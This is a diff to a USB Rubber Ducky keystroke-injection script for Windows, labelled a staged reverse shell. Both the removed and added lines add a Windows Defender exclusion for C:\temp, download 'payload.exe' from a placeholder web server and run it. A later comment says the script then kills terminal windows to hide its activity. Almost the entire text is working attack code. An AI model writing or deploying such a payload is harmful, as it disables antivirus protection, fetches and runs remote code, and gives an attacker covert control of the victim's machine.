@@ -1,7 +1,7 @@
 REM       |=========================================================================|
 REM         Staged Interpreter TCP Reverse Ducky Shell
 REM         Author: DVBNL
-REM         Version 2.1
+REM         Version 2.2
 REM         OS Tested: Windows 11, Windows 10
 REM         INTERPRETER STAGED REVERSE SHELL > executable
 REM         WORKS WITH NEWEST WINDOWS TERMINAL (wt.exe)
@@ -21,21 +21,16 @@ ENTER
 DELAY 1000
 
 REM |===Powershell Block to create variables and add exclusions to Windows Defender===|
-STRING_POWERSHELL
-    $dir = "C:\temp";
-    $shell = "$dir\shell.exe";
-    New-Item -Path $dir -ItemType Directory;
-    Add-MpPreference -ExclusionPath $dir;
-    Add-MpPreference -ExclusionPath $dir;
-END_STRING
+STRING $dir = "C:\temp";
+ENTER
+STRING $shell = "$dir\shell.exe"; New-Item -Path $dir -ItemType Directory;
+ENTER
+STRING Add-MpPreference -ExclusionPath $dir;
 ENTER
 DELAY 250
 
 REM |===Download shell executable from Webserver and RUN!===|
-STRING_POWERSHELL
-    Invoke-WebRequest -Uri http://yourwebserver/payload.exe -OutFile $shell;
-    Start-Process $shell;
-END_STRING
+STRING Invoke-WebRequest -Uri http://yourwebserver/payload.exe -OutFile $shell; Start-Process $shell;
 ENTER
 
 REM |===Kill all active wt or powershell processes (Visibility)===|
